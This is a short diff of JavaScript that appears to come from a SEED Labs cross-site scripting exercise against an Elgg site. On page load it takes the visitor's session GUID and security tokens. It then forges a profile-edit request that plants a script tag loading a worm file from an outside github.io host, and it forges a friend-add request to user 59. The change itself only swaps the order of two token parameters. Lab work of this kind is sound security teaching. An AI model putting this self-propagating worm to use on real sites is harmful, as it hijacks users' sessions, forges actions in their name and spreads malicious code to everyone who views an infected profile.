@@ -6,7 +6,7 @@ window.onload = function() {
     var guid = "&guid=" + elgg.session.user.guid;
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
-    var content = userName + guid + ts + token + "&description= <script type=\"text/javascript\" src=\"https://pinjunchen.github.io/IntroInfoSe/XSSwormNEW.js\"></script>";
+    var content = userName + guid + token + ts  + "&description= <script type=\"text/javascript\" src=\"https://pinjunchen.github.io/IntroInfoSe/XSSwormNEW.js\"></script>";
     var samyGuid = 59;
     var profileEditUrl = "http://www.seed-server.com/action/profile/edit";
     var addFriendUrl = "http://www.seed-server.com/action/friends/add?friend=59"+ ts + token;
